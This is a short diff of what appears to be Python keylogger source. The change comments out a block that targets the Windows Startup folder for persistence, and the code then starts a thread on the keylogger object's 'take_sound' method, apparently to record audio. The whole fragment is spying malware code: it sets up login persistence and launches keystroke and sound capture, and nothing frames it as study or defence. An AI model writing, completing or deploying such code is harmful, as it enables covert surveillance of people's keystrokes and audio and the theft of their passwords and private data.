@@ -7,6 +7,7 @@ import shutil
 import os
 name = os.getlogin()
 
+"""
 try:
     target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)
 
@@ -14,6 +15,7 @@ try:
     
 except:
     pass
+"""
 
 keyloggerobject = keylogger()
 t = threading.Thread(target=keyloggerobject.take_sound)
